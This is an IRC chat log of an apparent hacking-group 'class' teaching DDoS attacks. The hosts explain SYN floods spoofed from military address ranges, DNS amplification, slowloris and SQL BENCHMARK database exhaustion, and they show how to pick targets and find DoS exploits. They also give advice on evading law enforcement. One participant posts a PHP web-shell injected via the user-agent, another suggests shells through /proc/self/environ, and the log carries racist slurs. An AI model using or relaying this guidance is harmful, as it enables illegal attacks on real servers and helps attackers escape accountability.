(9:31:23 PM) Fox: Lose voice.
(9:31:49 PM) Fox: So, todays class, is to bring you low-life shitbirds out of the 4chan dregs of the Low Orbit Ion Cannon
(9:32:02 PM) Fox: the internet equivalent of shaking your dick at someone.
(9:32:12 PM) MrBlue [~MrBlue@LulzCo-D0CBE354.ias.bredband.telia.com] entered the room.
(9:32:31 PM) Fox: Hopefully by the end of this class you will have attained the knowledge to turn your dick into a godzilla like wrecking ball of destruction.
(9:32:42 PM) LordKitsuna: XD fox have i ever said how much i love the way you talk
(9:32:59 PM) Fox: So before I see a mass spam of PMs for "AMG WHATS THIS" blah blah blah
(9:33:04 PM) Fox: I'm gonna teach you the basics.
(9:33:40 PM) Fox: Distributed Denial of Service is the act of taking an internet connection down by an overwhelming amount of information being thrown at the box.
(9:33:45 PM) Fox: This can be one packet.
(9:33:50 PM) Fox: Or It can be billions.
(9:33:56 PM) Fox: * Denial of Service
(9:34:07 PM) Fox: As long as the host is down, that's all that matters.
(9:34:26 PM) Fox: Distributed obviously speaks for itself in the fact that multiple assets are used in order to take a target down.
(9:34:36 PM) Gralon left the room (quit: Ping timeout: 240 seconds).
(9:34:36 PM) Fox: Now lets move on to the basics of types of attacks.
(9:34:50 PM) Fox: Syn Flood.
(9:35:47 PM) Fox: A syn flood is a shitload of TCP/SYN packets with forged sender addresses these are handled by the target as an incoming connection request which causes the server to open a connection with out reciept
(9:36:13 PM) atriox left the room (quit: Ping timeout: 240 seconds).
(9:36:21 PM) Fox: The victim will send out a TCP/SYN-ACK and wait for a response that will never come 
(9:36:37 PM) Fox: So essentially lets say we have a 10mb pipe right?
(9:37:47 PM) Fox: Lets say that pipe can keep 1,000,000 connections open at a given time
(9:38:00 PM) Fox: We have 1,000 computers doing 1,000 connections
(9:38:03 PM) Fox: Do the math.
(9:38:10 PM) Fox: Side note for added Lulz: 
(9:38:23 PM) darkspline: are those accurate metrics Fox?
(9:38:28 PM) Fox: Vaguely.
(9:38:31 PM) darkspline: k
(9:38:34 PM) Fox: You know when it's fucking down
(9:38:54 PM) Fox: but guesstimated, yeah a 1,000 bot net will rock the fuck out of any home connection
(9:38:57 PM) Fox: Unless you suck dick.
(9:39:11 PM) eax: unless your bot sucks dick
(9:39:18 PM) Fox: LIST OF AWESOME IP ADDRESSES TO SPOOF FROM: http://www.uaff.info/militarytracking.htm
(9:39:24 PM) YaHMan: or they are rich and pay for 1gbps line?
(9:39:38 PM) Fox: YaHMan I've lived a lot of places, 1gbps is rare.
(9:39:39 PM) Fox: Anyways.
(9:39:45 PM) rj left the room (quit: Ping timeout: 240 seconds).
(9:39:47 PM) YaHMan: true.
(9:40:04 PM) Fox: Moving along to ICMP floods.
(9:40:04 PM) LordKitsuna: Fox, what is used to say how many connections the pipe can take? the pipe itself or the equitment on the other end, my router says it has a (theoretical) max of 160,000
(9:40:24 PM) AnalTouring: LordKitsuna: that doesn't matter for SYN.
(9:40:32 PM) Fox: +1 analtouring
(9:40:35 PM) AnalTouring: LordKitsuna: only the amounth of 60 byte packets you can send a second does.
(9:40:50 PM) AnalTouring: Now, why those military ranges should be the source adress.
(9:40:59 PM) AnalTouring: The server replies to a SYN packet with an ACK Packet remember?
(9:41:12 PM) AnalTouring: It sends the ACK Packet to the source adress: it DDOS's the FBI.
(9:41:18 PM) AnalTouring: Meaning the server owner gets v&.
(9:41:49 PM) hate [~user@LulzCo-706F91F1.formlessnetworking.net] entered the room.
(9:42:07 PM) YaHMan: Does this method work for all servers(providing you have the bw)?
(9:42:13 PM) AnalTouring: YaHMan: yes.
(9:42:18 PM) YaHMan: k thx.
(9:42:50 PM) Fox: ICMP floods are something that someone I dont know who asked about
(9:43:06 PM) Fox: there are other variations that if memory serves me are dead and gone,
(9:43:18 PM) Fox: but ICMP is essentially a simple 'ping ' flood.
(9:43:26 PM) darkspline:  there are always new ones though
(9:43:41 PM) Fox: There are always new ones but Ping of Death don't really apply now does it.
(9:43:49 PM) Fox: TearDrop either.
(9:44:52 PM) darkspline left the room (Kicked by Fox (nigga what you know about DDOS.)).
(9:45:01 PM) Fox: Anyways.
(9:45:15 PM) t: icmp is generally the most common because its in most of the public bots that most of the skids use and also is one of the easier ones to stop because without custom coding it cannot be spoofed
(9:45:35 PM) darkspline [~darksplin@LulzCo-E5B1D91D.dyn.optonline.net] entered the room.
(9:45:41 PM) t: so you can just tell your router to drop the packets
(9:46:06 PM) Fox: +t. Wrong. ICMP floods by a competent network administrator can be blocked fairly easily.
(9:46:25 PM) t: thats what i said
(9:46:30 PM) t: is one of the easier ones to stop
(9:46:47 PM) Fox: ^^ router
(9:47:00 PM) Fox: I'm talking iptables and a bash script
(9:47:17 PM) t: mmmhhmmm
(9:47:27 PM) Fox: In a DC environment you most likely won't have that luxury of being able to write your own router rulesets.
(9:47:32 PM) Fox: Anyways moving along down the line.
(9:47:56 PM) Fox: Moving on to definitions for DDOS.
(9:48:02 PM) Fox: Command and Control.
(9:48:10 PM) eax: fox: forgot udp 
(9:48:20 PM) AnalTouring: eax: stfu
(9:48:38 PM) AnalTouring: eax: i could name 20 more ddos methods that noobs dont need.

(9:50:47 PM) Fox: Anyways
(9:50:52 PM) Fox: COMMAND AND CONTROL.
(9:51:06 PM) Fox: This is the method in which you provide commands out to the 'nodes' within your network
(9:51:16 PM) Fox: Bots
(9:51:33 PM) AnalTouring: (which you dont have, otherwise you wouldnt be here).
(9:51:54 PM) Fox: Boats, Nodes, Shells, Zombies, Drones, whatever. They're your soldiers. They are the weight to your big swinging dick.
(9:52:07 PM) Fox: (which obviously makes your internet dick a small little asian nothing.)
(9:52:45 PM) Fox: AnalTouring can you roll for a second
(9:52:47 PM) Fox: Grabbing a cigarette
(9:53:08 PM) AnalTouring: Bots are computers that you owned trough exploits or other means, or that other people gave to you to control.
(9:53:39 PM) AnalTouring: These boxes can be used to send shit over the internet.
(9:53:42 PM) srwx [~zach@LulzCo-C17AE2F0.wks.liquidweb.com] entered the room.
(9:53:52 PM) AnalTouring: Imagine there's a dude you want to troll. you start shouting over his phone.
(9:53:57 PM) AnalTouring: it doesn't work, you're shit out of luck.
(9:54:08 PM) AnalTouring: now imagine a hundred people that you coerced into shouting at him around you.
(9:54:14 PM) AnalTouring: DDOS with a botnet is kind of like that.
(9:54:26 PM) AnalTouring: just a bunch more computers shouting at the server.
(9:54:41 PM) AnalTouring: Everyone follow up till now?
(9:54:52 PM) YaHMan: which is better. Lots of small nodes with low bw or a reasonable amount of nodes with huge bandwidth like servers and shit?
(9:55:03 PM) AnalTouring: Small nodes, tons of them.
(9:55:17 PM) AnalTouring: Because shutting down a node is relatively easy if it's a large (say .gov or .edu) domain.
(9:55:29 PM) AnalTouring: 'cause admins of big sites don't want you to hax them.
(9:55:42 PM) AnalTouring: it's kind of like the little kid trying to bully the big kid into doing shit for him.
(9:55:53 PM) AnalTouring: and then zangief.jpg happens.
(9:55:59 PM) LordKitsuna: stupid question, is it possible to take control of network nodes.. like the ones cable providers use to give service to people (those big fukkers buried in the ground)
(9:56:13 PM) AnalTouring: Yes, technicall, tough not advisable
(9:56:17 PM) AnalTouring: *technically.
(9:56:25 PM) AnalTouring: and since you're in here, no fucking chance for you.
(9:56:52 PM) AnalTouring: So, who of you are still awake?
(9:56:58 PM) ***YaHMan  
(9:57:01 PM) Shidash: I am
(9:57:06 PM) eax: software you use is also important. almost any software out there currently is bug riddened and garbage
(9:57:18 PM) AnalTouring: eax: later.
(9:57:28 PM) eax: k
(9:57:35 PM) AnalTouring: So, you now realize that you have to shout harder than the legit traffic to the server.
(9:57:49 PM) t: you also have to watch what nodes you have for instance if you are hacking your "school" and it has 300 computers on it its not smart having all ov the computers send out 2gigs worth of data your gonna ddos the enternal network before it even gets to the target
(9:58:04 PM) AnalTouring: Remember the SYN attack, where you could spoof the source adress?
(9:58:14 PM) mode (-v t) by Fox
(9:58:46 PM) AnalTouring: Ok, now if you spoof the source adress, the server thinks a packet is from ANOTHER host than it's actually sent from.
(9:58:56 PM) AnalTouring: There is ONE MAJOR POINT i have to make about this so LISTEN THE FUCK UP.
(9:59:08 PM) AnalTouring: do NOT TRY THIS BEHIND A ROUTER. CHECK IF YOUR ISP allows spoofing.
(9:59:22 PM) AnalTouring: Because otherwise this WILL NOT WORK and you WILL BE V&.
(9:59:31 PM) AnalTouring: (most isps allow spoofing)
(9:59:35 PM) Fox: VANNED = ARRESTED.
(9:59:45 PM) AnalTouring: So, check if you have a router in your cabinet, if you do, spoofing will not work
(10:00:05 PM) YaHMan: Is there anyway of turning it off in routers? like custom firmware?
(10:00:12 PM) AnalTouring: no.
(10:00:15 PM) YaHMan: kk
(10:00:24 PM) LordKitsuna: another stupid question: what happens if you spoof your address to the address of the target? how does the target respond?
(10:00:26 PM) AnalTouring: It's nat OR ip adress translation that does this.
(10:00:40 PM) AnalTouring: LordKitsuna: not effective, it'd send it locally.
(10:01:06 PM) AnalTouring: Like pinging 127.0.0.1, really fast, but does shit all for wasting bandwidth.
(10:01:19 PM) AnalTouring: Ok, to see if you are BEHIND a NAT, go to start=>run=>type cmd and hit enter
(10:01:22 PM) AnalTouring: you now see a black screen.
(10:01:27 PM) AnalTouring: type ifconfig.
(10:01:39 PM) AnalTouring: if your IP is in the 192.168.0.xxx range, congratulations, you have a router.
(10:01:48 PM) AnalTouring: (thus cant do this shit).
(10:01:51 PM) Fox: And you are a complete faggot for not knowing this.
(10:02:03 PM) AnalTouring: Now, everyone follow?
(10:02:05 PM) eax: ipconfig*
(10:02:11 PM) LordKitsuna: dont mean to be to rude, but if you dont know you have a router idk if you should be in here
(10:02:12 PM) AnalTouring: thnx eax.
(10:02:24 PM) AnalTouring: LordKitsuna: probably not, but this is damn important
(10:02:52 PM) AnalTouring: Ok, i'll assume everyone followed up till here.
(10:02:52 PM) LordKitsuna: true
(10:03:08 PM) notacop_honest [~amnesia@2310E577.8E384C6C.DD213F82.IP] entered the room.
(10:03:12 PM) AnalTouring: Now you can send packets, or SAY SHIT to a server, and it thinks it's from another server, comprendre?
(10:03:16 PM) mode (+v bizzylulz) by Fox
(10:03:31 PM) Shidash: yes
(10:03:32 PM) AnalTouring: Now there are servers out there, that will reply with a BIGGER Message than you sent to it.
(10:03:43 PM) YaHMan: DNS servers?
(10:03:49 PM) AnalTouring: Exactly.
(10:04:01 PM) AnalTouring: That bigger message of course consumes more bandwidth.
(10:04:06 PM) AnalTouring: Which is what you're trying to achieve, remember?
(10:04:50 PM) AnalTouring: Ok, so you have a DNS server, which is a server that resolves website adresses to a computer adress.
(10:05:15 PM) AnalTouring: If it is recursive (there are tools to check this, GOOGLE IT FAGGOT), it is easy to get a much bigger reply from it than the packet you sent.
(10:05:20 PM) AnalTouring: this multiplication factor is up to 60 times.
(10:05:25 PM) AnalTouring: making you re-penis 60 times bigger.
(10:05:29 PM) AnalTouring: HOW DOES THAT SOUND TO YOU?
(10:05:37 PM) i0dine: FANTASTIC
(10:05:41 PM) YaHMan: l33t
(10:05:51 PM) AnalTouring: Now: we have a server that sends huge packets back.
(10:05:57 PM) AnalTouring: We have a way to spoof a source ip adress.
(10:06:00 PM) AnalTouring: Let's combine the two.
(10:06:10 PM) AnalTouring: We send a small packet to the server, with as source the IP of the server we want to DDOS.
(10:06:20 PM) AnalTouring: BOOM 60* the traffic you send to it goes to the server.
(10:06:30 PM) AnalTouring: Server pukes, craps it's guts out and dies
(10:07:04 PM) AnalTouring: There is a tool for windows out there to do this, it's called DHN.zip, most of the versions are infected by th3j35t3r, so if you download it, COMPILE IT YOURSELF (and remove it's tor binary)
(10:07:25 PM) ElEzio [~ElEzio@LulzCo-204A77E4.torservers.net] entered the room.
(10:07:29 PM) YaHMan: could you use plain old dig on linux to do that?
(10:07:48 PM) AnalTouring: Yup.
(10:07:59 PM) AnalTouring: There's a fuckton of tools on linux to do that.
(10:08:02 PM) AnalTouring: And it's fucking easy.
(10:08:10 PM) AnalTouring: But if you use linux, you'll probably know by now how to do this.
(10:08:47 PM) AnalTouring: Also, my keyboard is dieing.
(10:09:19 PM) AnalTouring: Now, everyone know how to compile DHN?
(10:10:13 PM) AnalTouring: anyone still here?
(10:10:17 PM) curi0us: no but i bet google does
(10:10:21 PM) YaHMan: yea soz
(10:10:26 PM) ***eax doesnt have the source so meh
(10:10:28 PM) Fox: AnalTouring most are not voiced.
(10:10:36 PM) AnalTouring: ok.
(10:10:52 PM) AnalTouring: KEYBOARD IS RLY NEARLY DED.
(10:10:56 PM) i0dine: I was just gunna refer to google if i found myself at a loss too : /
(10:10:58 PM) AnalTouring: so if i stop typing, take over.
(10:11:31 PM) AnalTouring: Ok, just go to 711chan/i/, download DHN from there if you're not sure.
(10:11:39 PM) AnalTouring: the oldest post of DHN there is safe.
(10:11:45 PM) AnalTouring: but ONLY THE OLDEST POST there.
(10:12:29 PM) AnalTouring: DHN will do SYN and DNS SPOOFIN'.
(10:13:05 PM) AnalTouring: Now that we've covered the most difficult basics, there's two more ways of ddosing that you need to know.
(10:13:09 PM) AnalTouring: both are BEST DONE OVER TOR.
(10:13:13 PM) AnalTouring: note that down.
(10:13:22 PM) AnalTouring: #1: slowloris.
(10:13:35 PM) AnalTouring: Slowloris is basically a mongloid talking to the server REALLY_SLOWLY.
(10:13:48 PM) AnalTouring: Because it talks really fucking slowly, you can consume a ton of connections before it senses you're a mongloid.
(10:14:03 PM) AnalTouring: Because it talks so slowly, it consumes little bandwidth.
(10:14:15 PM) AnalTouring: Because it consumes so little bandwidth, you can use it over TOR.
(10:14:20 PM) AnalTouring: everyone got that?
(10:14:34 PM) YaHMan: ye
(10:14:54 PM) AnalTouring: Ok, now just google slowloris and find yourself a version.
(10:15:05 PM) AnalTouring: I think it originally came from ha.ckers? (might have been sla.ckers).
(10:15:27 PM) AnalTouring: anyways. important option for ddos #2: consuming server CPU.
(10:15:28 PM) eax: ha.ckers
(10:15:33 PM) eax: google "slowloris.pl"
(10:15:41 PM) AnalTouring: the cpu is like a hamster. you make it run fast enough, it shits itself and dies.
(10:15:52 PM) AnalTouring: searches consume lots of cpu.
(10:16:04 PM) AnalTouring: sometimes you can use SQLI or other techniques, and get a database timeout.
(10:16:18 PM) AnalTouring: THOSE TIMEOUTS CAN SPELL THE DEATH OF A SERVER IF YOU HAVE A MILLION NIGGERS DOING THEM.
(10:16:28 PM) AnalTouring: this is also best done over TOR. (or your chinese botnet)
(10:16:42 PM) AnalTouring: basically, that's how you ddos servers.
(10:17:01 PM) AnalTouring: syn, dns spoofing, slowloris or attacking the database.
(10:18:00 PM) AnalTouring:  
(10:18:07 PM) AnalTouring: so, sumnmary: dns spoof if you can.
(10:18:07 PM) YaHMan: would attacking the nameservers achieve much?
(10:18:17 PM) AnalTouring: YaHMan: depends on the network, most of the times no.
(10:18:34 PM) YaHMan: k
(10:18:47 PM) AnalTouring: So, now that you have a bigger e-penis, you're eager to fuck something in the ass.
(10:18:54 PM) AnalTouring: remember your internet condoms kids (proxy, tor).
(10:19:15 PM) AnalTouring: But what would you fuck in the ass? Obviously the easiest target. You're not going after the marathon runner are you?
(10:20:00 PM) AnalTouring: The general idea is to google "sites by ip adress" or something simliar, get one of the search engines, see if there's more than one site on that server.
(10:20:11 PM) AnalTouring: If yes: see if there's one with a CPU intensive search page.
(10:20:32 PM) AnalTouring: If no: see if the company has a financial/database backend and ddos that (if you cant find it, dns spoof the frontend)
(10:20:42 PM) i0dine: I manually searched and googled, but I can't find the file you're refering to "Your search - site:711chan.org DHN - did not match any documents." Anyone else find it? Also, when a search comes back with an sql timeout, it can most likely be taken down by distributing that search?
(10:20:57 PM) Fox: Moment.
(10:21:04 PM) curi0us: i couldnt find it either
(10:21:11 PM) Fox: yougetsignal.com
(10:21:11 PM) AnalTouring: i0dine: yes.
(10:21:28 PM) AnalTouring: Fox: take over for a few seconds please.
(10:21:31 PM) Fox: Sure
(10:21:33 PM) AnalTouring: i'll b back in a moment.
(10:21:37 PM) Fox: So anyways 
(10:21:42 PM) Fox: Sites by IP address
(10:21:49 PM) Fox: lets say for instance that your target is fuckboy.com
(10:21:57 PM) Fox: right?
(10:22:04 PM) Fox: so what we're gonna do is ping fuckboy.com

(10:22:33 PM) Fox: Now 
(10:22:39 PM) Fox: we get an ip of 1.2.3.4

(10:23:15 PM) YaHMan: shared hosting?
(10:23:18 PM) Fox: and ohshitthissitewasREALLYpoorlycoded.com
(10:23:43 PM) Fox: That would indicated either a shared hosting environment, or a dedicated server depending on some of the hostnames found within that search.
(10:23:55 PM) dominus [deep@LulzCo-6D0FF491.dhcp.reno.nv.charter.com] entered the room.
(10:24:07 PM) Fox: IF you're really trying to be crafty you can try and find out what blocks of IPs were assigned to that server.
(10:24:30 PM) Fox: Usually if you're finding a main IP you'll find it in sets of /28's-/24's
(10:25:16 PM) Fox: Anyways
(10:25:18 PM) AnalTouring [~Nigr0@alt.zionism] entered the room.
(10:25:27 PM) Fox: moving along from this we find that ohshitthissitewasREALLYpoorlycoded.com
(10:25:43 PM) mode (+v AnalTouring) by eax
(10:26:03 PM) Fox: has a vulnerability that we can use by sending our bots to: ohshitthissitewasREALLYpoorlycoded.com/search.php?q=OHFUCKDDOS%20OHFUCK
(10:26:03 PM) Fox: Right?

(10:26:30 PM) Fox: So at this point sending our bots to that address
(10:26:36 PM) Fox: would have the effect of a million nigger army.
(10:27:02 PM) Fox: Analtouring would you like to pick back up
(10:27:52 PM) ElEzio left the room (quit: Remote host closed the connection).
(10:27:52 PM) Fox: Alright moving down the line
(10:28:06 PM) Fox: So we've sent our bots to that address and the host is down
(10:28:18 PM) Fox: since we've killed the connection that IP the box is DONE FOR
(10:28:19 PM) Fox: FUCK  YEAH.
(10:28:28 PM) Fox: Wait... no it's not.
(10:28:38 PM) Fox: because it's not just ANY site, it's a round robin DNS.
(10:29:16 PM) Fox: So round robin DNS 
(10:29:27 PM) Fox: is exactly what it sounds like if you're not a fuck-wit bitch boy.
(10:29:44 PM) AnalTouring: http://forum.intern0t.net/perl-python/823-dns-amplification-attack-proof-concept.html dns amplify for linux.
(10:29:58 PM) Fox: Multiple servers handling DNS records for that site going to fail over boxes in the event that one is disabled.
(10:30:05 PM) Fox: So IE:
(10:30:19 PM) Fox: I take out DNS1 and DNS2 that point to Server 3
(10:30:47 PM) Fox: DNS1 and DNS2 had other records pointing to DNS 3 and DNS 4 in the event that DNS 1 and 2 aren't able to be talked to
(10:30:55 PM) Fox: DNS 3 and DNS 4 point to server 5.
(10:31:17 PM) Fox: This is a fairly complex setup but is a huge step in 'casing' a target before hitting it
(10:32:03 PM) Fox: Because at this point we'd have to test over server 5 and find a sure-fire way to ensure that both server 1 and server 5 are down at the same time making an effective distributed denial of service.
(10:32:27 PM) Fox: So now there is one more big-boy before we get into how you make yourself a net.
(10:32:30 PM) Fox: But before that
(10:32:36 PM) Fox: I'd really like to stress something to you kids.
(10:32:58 PM) Fox: DO NOT TAKE WHAT WE ARE TELLING YOU LIGHTLY
(10:33:00 PM) Fox: THIS IS NOT LOIC.
(10:33:13 PM) AnalTouring: (and LOIC WILL GET YOU V&)
(10:33:31 PM) Fox: THIS IS THE DIGITAL EQUIVALENT OF SMASHING SOME FUCK IN THE NOSE WITH A MOSSBERG SHOTTY AND HOLDING THE GIRL AT GUNPOINT
(10:33:40 PM) Fox: This is digital shanghai.
(10:33:54 PM) YaHMan: vpns are safe though right?
(10:33:56 PM) Fox: Don't fuck around here, this is stick-up boy shit. You will do the same time.
(10:34:04 PM) Fox: I'll get to that after we finish the types of attacks
(10:34:08 PM) YaHMan: kk
(10:34:43 PM) Fox: Pay attention when I tell you how to protect yourself
(10:34:50 PM) Fox: If you get lazy, if you fucking slack
(10:35:16 PM) Fox: that one time will be the fucking time your traffic was monitored, you were connected to your network and you recieved a fucking thousand count case.
(10:35:46 PM) Fox: I've seen hundreds of people go down for this kind of shit, so wield it like you wield a gun, with precision, and with respect.
(10:37:01 PM) Fox: Anyways
(10:37:11 PM) AnalTouring: Also, if there's any trace of your nick on google linking it to you. now would be the time to fix (erase) that.
(10:37:13 PM) Fox: Moving along to another type that I'm going to glance over

(10:38:01 PM) Fox: Anyways,
(10:38:22 PM) Fox: Another type of service that was brought to my attention was buffer overflow.
(10:38:29 PM) Fox: This is another type of hardware overload.
(10:38:37 PM) AnalTouring: *Software
(10:38:44 PM) Fox: Thank you.
(10:38:54 PM) AnalTouring: And you DONT FUCKING DARE USING IT FOR DDOS.
(10:39:00 PM) AnalTouring: IF YOU FIND ONE, SEND IT TO SOMEONE WHO KNOWS WHAT TO DO WITH IT.
(10:39:10 PM) AnalTouring: BoF > DDos any time.
(10:39:10 PM) Fox: Exactly.
(10:39:54 PM) LordKitsuna: Question: i assume thats what the little button in my routers security logs that says "prevent buffer overflow" is reffering to?
(10:40:07 PM) somatose [~somatose@LulzCo-E964C21F.hsd1.ca.comcast.net] entered the room.
(10:40:09 PM) AnalTouring: different buffers.
(10:40:36 PM) i0dine: Bofs seem like a pretty easy thing to defend against, are there really devs who let them slip? or am i thinking of them too simply
(10:40:54 PM) AnalTouring: i0dine, have you ever written c/c++?
(10:41:04 PM) str4d: i0dine: often they arise from software bugs rather than bad server configs.
(10:41:09 PM) AnalTouring: it's non-trivial to write FAST and secure code.
(10:41:15 PM) i0dine: yea, but not anything very web-related
(10:41:26 PM) i0dine: okay
(10:41:27 PM) AnalTouring: now, on using exploits.
(10:41:34 PM) AnalTouring: you're not fucking likely to ever find one, that's why you're here
(10:41:47 PM) AnalTouring: .instead you can use canned exploits, like those from milw0rm (it died, find another like exploit-db).
(10:41:59 PM) AnalTouring: Exploits marked DoS are often a good start for a denial of service.
(10:42:14 PM) AnalTouring: Use nmap -sV to check the server's software version, find an exploit.
(10:42:19 PM) AnalTouring: If there's one, you're in luck.
(10:42:28 PM) s0n1cK left the room (quit: Quit: Leaving).
(10:42:30 PM) AnalTouring: If there isn't one: back to step 1 and ddos normally.
(10:43:06 PM) eax: (although if there is a BoF leading to DoS you can more than likely turn it into a code exec BoF)
(10:43:08 PM) AnalTouring: http://www.exploit-db.com/ say my server runs apache 2.2.0, find me a Denial of service exploit for that server.

(10:43:37 PM) AnalTouring: Apache 2.2.0
(10:44:26 PM) ***eax found it :3
(10:44:37 PM) AnalTouring: good.
(10:44:42 PM) AnalTouring: at least one person who isn't a complete fuckwit.
(10:44:45 PM) AnalTouring: anyone else find it?
(10:44:57 PM) str4d: Yup.
(10:45:09 PM) LordKitsuna: i can find for 2.2.14 but not 2.2.0
(10:45:20 PM) YaHMan: then it will work for 2.2.0
(10:45:24 PM) YaHMan: right?
(10:45:25 PM) AnalTouring: 2.2.14 is bigger than 2.2.0 right?
(10:45:32 PM) AnalTouring: that means that it'll probably work on 2.2.0
(10:45:37 PM) LordKitsuna: oh ok then
(10:45:39 PM) AnalTouring: but if you're not sure, READ THE FUCKING DOCUMENTATION.
(10:45:54 PM) AnalTouring: I'm sure you all know what a computer emergency response team is.
(10:46:02 PM) AnalTouring: Those are the dudes that will try to get you arrested when you fuck shit up.

(10:46:40 PM) AnalTouring: https://addons.mozilla.org/en-us/firefox/addon/server-spy/ WRONG.
(10:46:45 PM) AnalTouring: now visit it with that firefox addon.
(10:46:50 PM) AnalTouring: you will see it runs apache 2.2.0

(10:47:50 PM) AnalTouring: Ok, so now that you know that there's a big probability of actually FINDING an exploit, you better get to know how to run them, and how to tell fake from non-fake exploits.

(10:48:36 PM) AnalTouring: apache is the most well known web server, so remember those lists.
(10:48:48 PM) AnalTouring: now that you know how to FIND exploits, you must learn how to USE them.
(10:49:01 PM) AnalTouring: to USE them you must somewhat UNDERSTAND how they work, or at least how to run the code.
(10:49:23 PM) AnalTouring: For that, teach yourself some basic programming skills.
(10:49:43 PM) AnalTouring: As in "HOW DO I RUN PHP SCRIPTS GUISE?"
(10:49:51 PM) AnalTouring: Google it and you'll find a million answers.
(10:50:15 PM) AnalTouring: now
(10:50:20 PM) AnalTouring: onto other ways of denial of service
(10:50:27 PM) AnalTouring: one of my favorites, SQL Injection.
(10:50:35 PM) eax: (most exploits are written in ruby, perl, python, and C)
(10:50:38 PM) AnalTouring: yes SQL has built in DoS functionality, believe it or not!
(10:51:02 PM) AnalTouring: http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_benchmark
(10:51:12 PM) AnalTouring: ok, you might think that's harmless.
(10:51:17 PM) AnalTouring: but that does something a million times.
(10:51:23 PM) AnalTouring: now if that something is fucking slow.
(10:51:28 PM) AnalTouring: like old people fuck.
(10:51:35 PM) AnalTouring: that shit's going to make the server slow.
(10:51:38 PM) AnalTouring: again, like old people fuck.
(10:51:52 PM) AnalTouring: but omg how do i do this?
(10:51:58 PM) AnalTouring: first you must know how to find a SQL Injection.
(10:52:11 PM) AnalTouring: give me a few minutes to find you a practice target, while Fox continues.

(10:57:47 PM) zone: heard sniffing tor was a national sport.
(10:57:57 PM) LordKitsuna: AnalTouring, idk ` setup that up on my vps so i assume he had everything locked down
(10:57:57 PM) AnalTouring: REASON WHY: TOR ROUTES TROUGH THE HIGHEST BANDWIDTH NODES.
(10:58:03 PM) AnalTouring: GOVERNMENT HAS A LOT OF HIGH BANDWIDTH SERVERS.
(10:58:11 PM) AnalTouring: IF YOUR ENTIRE ROUTE IS GOVERNMENT NODES, YOU ARE COMPROMISED.

(10:59:31 PM) llama: hi guys :-)
(10:59:32 PM) AnalTouring: z3rod4ta: always use SSL. pray to god that the government doesn't know who you are.
(10:59:34 PM) LordKitsuna: zone, afaik tor ssl is only ssl to the tor node but i could be wrong
(10:59:46 PM) notacop_honest: someone mentioned routing through more than 3 nodes and using offshore servers...  how do you do that?
(11:00:00 PM) zone: http://nspill.blogspot.com/2010/04/tor-exit-node-sslstrip.html
(11:00:08 PM) whiteh8: another thing; don't check your facebook with tor just after you got done owning something; they can check that
(11:00:17 PM) nachash: ^
(11:00:21 PM) str4d: LordKitsuna: no, SSL is to the end server. Tor has onion routing up to the end node.

(11:02:52 PM) AnalTouring: kremlon: try defacing it with a php shell in /proc/self/environ in a post value:P
(11:02:55 PM) Anorov: what was the practice site?
(11:03:02 PM) nachash: The takeaway from what we're all telling you is that tor is not an end all be all solution.
(11:03:13 PM) AnalTouring: i won't say that 'cause i'm not sure they actually walled it off.
(11:03:17 PM) nachash: You've got to use your head for something other than anal stretching if you want to stay anonymous.
(11:03:17 PM) AnalTouring: it was probably set up by dumb lusers:P
(11:03:26 PM) Liberty: TOR + anonymous prepaid 3d or wifi card
(11:03:33 PM) Liberty: 3g*
(11:03:53 PM) nachash: Don't use that shit at home, either.
(11:04:03 PM) Kitsune: Liberty, i are pretty sure 3G can be traced (to within like 3blocks but still)
(11:04:10 PM) nachash: Beware of FCC vans running fox hunts.
(11:04:12 PM) YaHMan: triangulation
(11:04:17 PM) curi0us: errrr not to be a tard, but how do you find reliable proxies? i know there are sites that have lists and tools to check them, whats the best strategy
(11:04:18 PM) Liberty: thats why you pay in cash for it :)
(11:04:30 PM) AnalTouring: curi0us: you saw the example page right?
(11:04:37 PM) AnalTouring: now let me turn it into a proxy for you with a php shell.
(11:04:40 PM) AnalTouring: ,give me 5 minutes:P
(11:04:44 PM) Anorov: curi0us: using conventional proxies is typically not recommended for illegal activities
(11:04:44 PM) zone: lol
(11:04:58 PM) Anorov: you need at least a layer of like a logless vpn or a network that's not your own
(11:05:00 PM) curi0us: i didnt see the example page
(11:05:00 PM) nachash: Conventional proxies can be assumed to be kinked by the operator
(11:05:05 PM) nachash: Just like tor exit nodes
(11:05:05 PM) Anorov: yep
(11:05:08 PM) z3rod4ta: so TOR+VPN ok?
(11:05:08 PM) Anorov: or if necessary subpoena'd
(11:05:13 PM) Anorov: depends on the vpn
(11:05:14 PM) curi0us: yea, thats what i thought
(11:05:18 PM) curi0us: hence being confused
(11:05:21 PM) nachash: Remember kids, if they're not selling you something, they're selling you.

(11:05:39 PM) YaHMan: how do you know if its logless? or can you not assumes so?
(11:05:50 PM) Anorov: do not assume it's logless unless it's a trusted overseas company
(11:05:54 PM) Anorov: i'm pretty sure swissvpn is good
(11:05:56 PM) curi0us: so the best bet is to anony get a vpn service?
(11:05:58 PM) Anorov: trusted to be logless, that is
(11:06:07 PM) z3rod4ta: Anorov: how would we verify if a VPN is trusted?
(11:06:07 PM) curi0us: *anony pay for a vpn service
(11:06:08 PM) YaHMan: curi0us, pre-paid credit card bought with cash anonymously
(11:06:13 PM) nachash: And keep in mind that almost all these services get backdoored by the man eventually.
(11:06:16 PM) Anorov: z3rod, testimonies of people who use it generally
(11:06:16 PM) AnalTouring: Can any of you fags chime in on a /proc/self/environ alternative?
(11:06:21 PM) Kitsune: i just use computers of people i ha8 to proxy
(11:06:28 PM) nachash: Hushmail was backdoored for the DEA etc for a couple of years before anyone found out
(11:06:39 PM) Anorov: hushmail specifically says if you do anything illegal, they'll give your info to the feds
(11:06:51 PM) hatter: AnalTouring: sure, /proc/self/fd/[int]
(11:07:00 PM) Kitsune: like right now im sshing into the comp of some bitch who pissed me off (we used to be friends thats how i got control of the box)

(11:08:15 PM) Anorov: might be good might not be
(11:08:25 PM) z3rod4ta: Anorov:  can you list us some trusted VPN's?
(11:08:25 PM) Kitsune: they most likely log
(11:08:30 PM) Kitsune: but i dont do any haxoring
(11:08:38 PM) Kitsune: im just here to listen/donate recources
(11:08:40 PM) Nyse: just request something
(11:08:53 PM) zone: and get ip's for ur bosses we all know that
(11:08:55 PM) Nyse: w/ ur useragent <?php echo system(array_unshift($_GET)); ?>

(11:09:12 PM) Anorov: Spam / DDoS / Illegal Activity: If your intention is to use the RapidXen service to violate US law, or any local laws for the location where your VPS is, or disrupt our network and other networks, or send out unsolicited bulk email, then RapidXen is not for you.
(11:09:24 PM) Anorov: if you did anything seriously illegal they'd probably cooperate with police
(11:09:27 PM) AnalTouring: Nyse: i know.
